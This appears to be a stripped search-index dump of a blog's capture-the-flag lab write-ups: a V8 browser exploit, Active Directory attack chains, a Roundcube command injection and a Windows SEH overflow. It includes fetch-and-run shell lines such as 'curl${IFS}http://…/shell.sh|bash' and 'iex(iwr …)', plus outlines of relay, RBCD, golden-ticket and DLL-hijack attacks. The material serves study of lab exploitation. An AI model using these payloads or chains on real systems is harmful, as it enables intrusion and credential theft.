:)","fixing the srp to be 0x24 bytes into the password input password = 0x41*0x4 + 0x4c44 + 0x41*0xDA","this works!"]}],[{"l":"Reaper 2 Part 1 | Browser Exploit"},{"l":"Recon","p":["IP: 10.10.65.169","Looking at port 80 it seems to be a v8 instance:","Looking into these compiles flags there seems to be a chromium issue a POC and working exploit for linux: https://issues.chromium.org/issues/41483297.","Checking the smbshare there is a release build of d8, there is no point building the exploit for the dev version"]},{"l":"d8 exploit"},{"l":"POC to Primatives","p":[":D","Adding that to the poc:","As we are using element 0 for egghunting we need to shift the offsets in the read and write by 1.","Attaching to windbg and running:","checking if it works:","If we look at the c objects table entries we find a reference to a's table:","Instead of going straight to the working exploit. Disclaimer I have no idea what i am doing with browser exploits so below is an outline of what makes sense for me.","Lets dump all the objects with a debugprint and see if we can see anything useful","Looking at the exploit they seem to use a PACKED_DOUBLE_ELEMENTS which is like a list or something? but anyways this is the metadata we need to use the object:","Next it would be a good idea to leak the value of the type_confused_array. We can do this by creating a marker and then searching proc memory to find it. It's basically a egghunter.","Next would be to see if we can add and remove items to leak something:","Nothing happened :|","Now we can create an arb read and read the base of V8 to check it works:","Playing around with the fields (or read the exploit) you can see that this maps to the .size call. Which means we have a type confusion primitive.","Running the poc we see it works!","Running the updated poc we can see that r.size is now fake_arr_struct[1]","Should check if the poc actually works.","that looks like a type confusion to me :D","The above should remove everything and read a random value as a string.","Then we just do the egg hunt again:","We can also convert the arb_read into an arb_write really easily:","We can also expand this to read the location of random objects by adding an object array to type_confused_array","We can wrap this into a helper function:","We should update the PACKED_DOUBLE_ELEMENTS value to match our system first:"]},{"l":"Code Exec","p":["Now that we have an arb read and write it is a good time to figure out how to get code exec. Looking back at the working exploit provided you can convert js -> webassembly text -> wasm using the following method:","convert to f64","Write as webassembly text:","compile to wasm","Finally we can convert it to an intarray with python and add it to the poc:","Running the above code in d8 we can check how the shellcode is structured:","that sounds interesting. Lets set a breakpoint and call main();","After single stepping for a while we find this:","This is annoying to say the least. Before we get carried away lets update the jump_table_start to be where our shellcode starts with the arb write. To do this we need the offset of jump_table_start from wasmInstance and the offset to teh shellcode","Adding it to the poc:","changing the shellcode to be nops and breapoints then running it gives code exec!!"]},{"l":"Shellcoding","p":["We can run code via Winexec, to do this we need a pointer to kernel32. So time for a PEB walk :)","Winexec takes 2 args:","which means rcx needs to be the path to the file we want to run and rdx needs to be 0. To write a string we can do the following pattern:","resulting in the string pointer being written to rsp. At the end we can do a:","Writing this to a python script:","Swapping out the wasm for the above and running the poc again:","SHELL!!","Now to change the offsets to run against the remote target and its another shell!","This blog is getting kind of long. So instead of trying to cram in the kernel driver I'm going to split it into 2 parts."]}],[{"l":"Heron","p":["IPs: 10.10.172.101 10.10.172.102"]},{"l":"Recon","p":["Also checking where the dc with nslookup:","Also gives the hostname of MUCDC.heron.vl","As im still not sure what website this controls im going to quickly fuzz for vhosts:","As there is no need to do any fancy opsec stuff, I'm just going to iex a powershell revtcp oneliner. (not adding shell.ps1 as it triggers chromes AV scanner :|)","As we can read the SYSVOL going to see if there is a gpp password.","As we have root on the linux box and its domain joined we can extract the ntlm hash from the /etc/krb5.keytab file then configure RBCD and request a ticket.","As we still dont have domain credentials we could try to asreproast:","At this stage I tried a few different ways to forward a port so I dont have to use the jump box to stage and catch a shell but nothing seemed to work.","Checking shares again with this user shows that we can read and write to accounting$","Checking the home directory shows two domain users:","Checking the shares shows that there is an accounting$ share that could be interesting.","Cracking the hash with hashcat gives us domain creds!","Fin","Going to password spray again to see if there is password reuse.","Going to password spray to see if this password has been reused as it looks like a generic domain password.","Going to set up a socks proxy over ssh when logging in, which should be useful later on.","In the share there is a web.config file. This can be used to backdoor the application and gain RCE in the context of the IIS server. This is a good post if you want more information: https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/","Logging into the home$ share as this user gives us more creds in a .lnk file.","Now is probs a good time to run bloodhound.","Port 80: Looking at the website gives us a more usernames:","So going to the path gimmieshell.pls should give us a rev shell back. The annoying thing is going to be doing this all via the socks proxy, as the webapp wont be able to talk directly to our box.","The domain admin is called _admin and the adm_prju user has WriteAccountRestrictions over the domain controller. This means we can configure RBCD for the DC and request a ticket on behalf of a domain admin.","The new web.config:","The shell is super unstable but that doesnt matter as looking shows there is a file with ssh creds!","The ssh login gives us a host name also implying that the box is domain joined.","Then going to http://accounting.heron.vl/shell.me to trigger the payload.","Then logging in with wmiexec:","This chain starts as an assumed breach with on ssh open on the 10.10.172.102 jump box.","This user is also in the sudo group and can run ALL ALL as root.","This worked!! Now we are:","Uploading the new web.config and using python3 and nc on the jump box to stage and catch the reverse shell.","We are given the following credentials:","What we can do is open up 2 reverse port forwards from the jump box to us. One for the payload download, and the other for a shell.","With this we can check for some common ports on the domain controller."]},{"l":"Beyond Root","p":["Very fun chain, really liked how you didnt really need to rely on any fancy AD tricks till the end. I wanted to try to backdoor the web.config file without having to override the current configuration of the webapp but couldnt find a way.","When looking at the way others solved the box the ssh.ps1 file was unintended. The correct way was to use the .krb5login and to backdoor ssh to get the login password. You could also have used the aduit group that svc-web-accounting is in to set up rbcd on the jumpbox, which would have given root.","Someone also mentioned you can hijack the dll in the accounting$ share and gain a shell that way.","As there is a bunch of stuff to try I'm going to leave it for now and post another writeup going over this with a focus on DLL Proxying."]}],[{"l":"Hybrid","p":["IPs: 10.10.215.165 10.10.215.166"]},{"l":"Recon","p":["Nmap: 10.10.215.166 mail01.hybrid.vl","10.10.215.165","There is a roundcube instance listening on port 80.","rpcbind and nfs are open, going to check nfs shares:"]},{"l":"RoundCube CVE","p":["Mounting the share shows a backup file.","The dovecot-users has credentials!","Logging in with the admin account and looking around shows a few interesting things.","The application version is: Roundcube Webmail 1.6.1 and the markasjunk plugin is installed.","There is an advisory talking about how the markasjunk extension can be used to get RCE: https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/","\"The vulnerability can be triggered by any Roundcube user who can change his email identity as well as mark an email as junk, both being trivial requirements.\"","There is also a nice POC: admintouch${IFS}test.txt@roundcube.com","So something like curl${IFS}http://10.8.0.110:8080/shell.sh|bash should work.","There is a black list for the : char, so going to have to decode via b64 instead.","This works giving a shell as www-data on the box."]},{"l":"NFS privesc","p":["Looking around shows that there is another user called: peter.turner@hybrid.vl on the box. Using this you can privesc to this user via nfs by manipulating the UIDs.","To do this we need to get a copy of bash off the target then create a new user with the same id as peter.turner@hybrid.vl.","Then we can bash back to the share and mark it as a setuid:","Then to privesc: /opt/share/bash -p and we are peter.turner","There is a keepass db, using the password from before gives domain creds:","This user can run ALL ALL as root, so root on mail01!"]},{"l":"Domain Admin","p":["As this box is domain joined, we can read the keytab file to get the machine hash:","Looking for quick wins with ADCS:","Requesting a certificate as administrator:","Then requesting a TGT:","This shows that PKINIT is not set up for this Domain, instead we can request a certificate for the domain controller and set up rbcd for a domain admin.","Convert the pfx to cert and key:","Configure RBCD:","Request a ticket.","login with wmiexec:","TaDa!"]},{"l":"Beyond Root","p":["Overall a really nice box, there a two things that I would like to change tho,","Remove RBCD","Request a TGT then HOST and CIFS Service Tickets before authing to wmiexec.","Both these are easy to do.","To remove RBCD I found out you can just specify flush_rbcd in passthecert","For the proper kerberos flow I requested a TGT for mail01$ then requested a cifs ticket."]}],[{"l":"Intercept","p":["IPs: 10.10.233.69 10.10.233.70"]},{"l":"Recon","p":["nmap:","10.10.233.69 dc.intercept.vl","10.10.233.70: ws01.intercept.vl","Checking smb there are a few shares on ws01:","There is a note in the dev directory mentioning that users are likely to open this share. With this in mind we can upload a scf file and grab the hash of the user with responder."]},{"l":"Domain Account","p":["Starting responder:","Then uploading a scf file and waiting we get back a hash!","Cracking this hash gives Chocolate1."]},{"l":"Machine Takeover","p":["Going to check if webdav is enabled on this server, if it is we should be able to use petitpotam and coerce the machine into talking to the domain controller via ldap:","Checking the ldap settings on the dc","Nice, so to set the attack up we need an account with a SPN and a dns entry pointing to our host:","With the setup done, next is to trigger and relay the authentication to ldap:","Checking the output of ntlmrelayx shows that we can now impersonate users on ws01!","Requesting a ticket impersonating administrator then dumping secrets:"]},{"l":"Domain Admin","p":["Now is a good time to run bloodhound and also certipy, incase there is ADCS. Looking at the certipy output:","Also in bloodhound the simon.bowen is able to join the ca-managers group which would allow the account to manage the CA, Which is esc7.","To add the user to the group we can use net rpc:","To request a certificate for a domain admin we need to become a office so we can approve templates, enable the subca. Then request and approve a certificate and finally get the NTLM hash of the user via PKINIT.","Then finally get the NTLM hash:"]}],[{"l":"Lustrous","p":["IPs: 10.10.186.5 10.10.186.6"]},{"l":"Recon","p":["Nmap: 10.10.186.5 - LusDC.lustrous.vl","10.10.186.6 - LusMS.lustrous.vl","FTP: Anonymous auth is allowed and in the directory there are 4 potential users:"]},{"l":"Foothold","p":["Going to try asreproasting.","This cracks to Trinity1"]},{"l":"LDAP Analysis","p":["As we now have domain creds, and there isnt any more low hanging fruit I'm going to run a bloodhound scan:","There are 2 kerberoastable accounts, being:","The tony.ward user has generic write over the domain admins group, and is also a member of the backup operators."]},{"l":"Lateral Movement","p":["The svc_web account has a SPN for http://lusdc.lustrous.vl, going to this site returns a 401 due to invalid creds. If we are able to compromise this account via kerberoasting we should be able to auth to the web app using kerberos.","This ticket also cracks to iydgTvmujl6f. Using this we can create a silver ticket for any user to auth to the web application. I'm going to use the tony.ward user as he might have special privs in the context of the web app too.","to do this we need the nthash of service account, the domain sid (from bloodhound) and the user-id (also in bloodhound)","Then in firefox update network.negotiate-auth.trusted-uris to https://lusdc.lustrous.vl, export the ticket and start firefox.","You can also do it via curl:","Going to the /Internal endpoint shows a password reminder note for tony.ward","Checking if its a valid domain credential:"]},{"l":"Domain Admin","p":["As tony.ward is a member of the backup operators we can use reg.py to dump the SAM and SECURITY hives. To do this we have to start a smbserver","This was very unstable and I couldnt get it to work, so instead, I'm going to do it from a windows machine. What we can do is login via winrm as ben.cox and then use runas to execute BackupOperators.cpp as tony.ward to exfiltrate the hives.","updating the machine name on line 31 in BackupOperators.cpp and its good to go.","Then just grab the files with smbclient, make sure you are in the C:\\Windows\\temp folder when grabbing the files due to windows icacls on the temp folder.","Then dumping the machine hash","Now we can grab the DA hash.","Finally login with evil-winrm","Fin"]},{"l":"Beyond Root","p":["Had a lot of fun, got stuck trying to dump the registries remotely with reg.py for some reason the server kept closing the connection. I also played around with changing BackupOperators.cpp to dump to a share, which worked.","There is also a cool trick to kerberoast a user from an asrep ticket, which would have been useful if the ben.cox ticket didnt crack, you would then also have to set up a windows box so you could dump the sam and system hives. This should still work as you can add a DNS entry to a random ip by default in AD."]}],[{"l":"Rainbow","p":["IP: 10.10.111.194"]},{"l":"Outline","p":["This is a bit different to the other boxes and instead focuses on binary exploitation. We are given a simple POC to crash the application:"]},{"l":"Recon","p":["Nmap scan:","FTP has anonymous auth, logging in shows the rainbow.exe binary."]},{"l":"Binary Exploitation","p":["I'm going to copy the binary across to a windows machine and set up a debugger so we can analyse and debug crashes.","With this done firing off the POC from above gives:","As eip / esp are not smashed, thinking it might be SEH:","Yep.","Before finding the offset, we should check the protections of the binary:","No ASLR or DEP, so we can just use a simple pop pop ret; and execute shellcode on the stack.","We should also consider bad bytes. As this is a POST request, 0x00, 0x0d, 0x0a wont be valid."]},{"l":"SEH Offset","p":["Updating the script to use a cyclic pattern for the body instead of A's","Recrashing the application shows the NSEH record is now 0x77413177","Validating the offset is right:","So the NSEH record should be BBBB","Nice!"]},{"l":"Redirecting Execution","p":["Checking for PPRs with ropper:","All the gadgets start with a 0x00 which means we wont be able to use anything after this gadget. For now we can see where we land, and potentially use a jmp to go back to the start of the buffer, where the shellcode has already been written.","After the PPR eip is at 0x9efbe4 while the top of our input buffer is at 0x9ef950, so a jump of 0x294 would place eip at the top of the stack.","Running the above shows that we only have 4 btyes to do the jmp","What we can do is a short jump \"back\" 12 to the start of the 0x41's then a jump to the top of the buffer.","This puts us back at the top of the payload leaving 624 bytes for a shell."]},{"l":"Testing against target","p":["Using msfvenom:","prepending the payload and running it gives a shell!","Now to test it against the target. Swapping out the shellcode and IP, and it works!!"]},{"l":"Root","p":["Looking at the users groups:","We are a member of administrators but not in a high integrity process. Going to run https://github.com/hfiref0x/UACME to bypass UAC","Now we are in a high integrity process.","Fin."]}],[{"l":"Reflection","p":["IPs: 10.10.177.149 10.10.177.150 10.10.177.151"]},{"l":"Recon","p":["Nmap:","10.10.177.149 dc01.reflection.vl","10.10.177.150 ms01.reflection.vl","10.10.177.151 ws01.reflection.vl","smb: Anonymous bind","checking the staging share, there are creds for the mssql db:","Logging in with the user, we dont have the ability to impersonate or xp_cmdshell, as smb signing is disabled we should be able to relay to places.","Running xpdir_tree in mssqlclient and then catching it in responder shows 2 things:"]},{"l":"SMB Relay","p":["The mssql server is running as a domain user, and its a ntlmv2 hash. We can relay this to smb on the other boxes using ntlmrelayx:","Then when running xp_dirtree again we get a smb shell on a local port:","There was nothing on the ws01, doing the same thing for dc01.","Again providing more creds:","Logging into the db on the domain controller gives us domain creds!"]},{"l":"Bloodhound analysis","p":["Now with domain creds, we can finally run bloodhound:","The abbie smith user has generic all over the ms01 box, which also has LAPS. With this we can get admin on the machine.","The georgia.price user has generic all over ws01, if we get access to this user account we can configure rbcd and login as admin.","dom_rgarner is also a domain admin."]},{"l":"MS01 to WS01 lateral movement","p":["running secretsdump with the laps account shows","Cached credentials for georgia.price and cleartext pwd for the web service account.","I'm going to upload and run sharpdpapi to see if the credentials are stored within dpapi on the machine.","nice! now for rbcd:"]},{"l":"Domain Admin","p":["Going to secrets dump the ws01 box with the hopes of finding more cached credentials:","This account looks like the low priv version of the domain admins account. Let's hope for pwd reuse:","TaDa!"]}],[{"l":"Tengu","p":["IPs: 10.10.180.37 10.10.180.38 10.10.180.39"]},{"l":"Recon","p":["Nmap: 10.10.180.37 DC.tengu.vl","10.10.180.38 SQL.tengu.vl","10.10.180.39","Looking at port 1880 it is running node-red"]},{"l":"Domain Foothold","p":["What we can do is add an exec block and send a revshell:","Looking at the home directory there are 2 localusers:","As this box can hit kerberos and ldap we can use chisel to set up a socks tunnel and see if the svc user is roastable.","Going to kick off another nmap scan on the host, running this via a proxy will take forever.","SQL:","DC:","Both users are not in ldap.","As nodered is able to connect to mssql it has to have the credentials somewhere.","There is a decrypt script: https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/ using this we can decrypt the file:","logging in and enumerating the db we find hashed creds for a domain user:","This hash cracks to Tengu123!","Using this account we can ssh in and su as root."]},{"l":"Pivot to SQL","p":["Going to run bloodhound.","Analyising the results shows a few interesting things; the linux server can read the gmsa password. This account can then be delegated for mssql service tickets.","With this in mind we can get system on the sql server.","Grabbing and decrypting the keytab file:","Requesting the gmsa account and delegating a ticket for administrator","The login to mssql:","Going to try again but with t1.w_winters","We can also run xp_cmdshell which means rce! Checking the privileges of the user account shows that we also have seimpersonate which means we can get system.","Going to use a tcprevshell for the initial access then sweatpotato for the privesc:","Creating a quick revshell with msfvenom:","Then firing the exploit:"]},{"l":"Domain Admin","p":["Time to dump everything with mimikatz:","winrm into the dc:","This just means we have to use kerberos auth:"]}],[{"l":"Trusted","p":["IPs: 10.10.217.117 10.10.217.118"]},{"l":"Recon","p":["Nmap: 10.10.217.117 trusteddc.trusted.vl","10.10.217.118 labdc.lab.trusted.vl","Seems to be a parent and child domain which will be interesting.","Checking port 80 shows that xampp XAMPP for Windows 8.1.6 is running, this has a webdav exploit https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit but the endpoint doesn't seem to exist.","Fuzzing with ffuf shows a /dev endpoint:"]},{"l":"Foothold","p":["On the main page there is a note:","The URI path for the website also looks very interesting:","Using this we are able to read arb files:","Fuzzing again shows a file called db.php","Which has db creds:","Logging into the db gives creds!","Throwing these in hashcat gives:"]},{"l":"Lateral movement to ewalters","p":["Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.","Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.","Then checking that it is set.","Nice! We can also login with winrm"]},{"l":"DLL Hijack to DA","p":["Looking around there is an AVTest directory with two files: kasperskyremovaltool.exe and readme.txt","The note mentions another user is expected to run this program:","A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)","To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.","https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking","Do this you will see that the application tries to load KasperskyRemovalToolENU.dll a few times. So if we make a dll and call it KasperskyRemovalToolENU.dll and place it in the same location as the kasperskyremovaltool.exe we will get a shell.","Being lazy and using msfvenom:","Uploading the file and waiting a bit we get a shell as cpowers that happens to be a domain admin on the machine."]},{"l":"Forest Privesc","p":["Going back to bloodhound shows that there is a parent domain called trusted.vl to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for lab.trusted.vl and forge a golden ticket. To get this we can just do a dcsync on the dc with mimikatz.","We also need the domain sid of both domains, both available from bloodhound.","We can use the default Enterprise Admin groups SID being <domain_sid>-519","Now to form the ticket:","Then login with psexec:",":D !"]},{"l":"Beyond Root","p":["Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho.","You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.","Then you can just iex(iwr http://server/file.ps1) to get a revshell."]}]]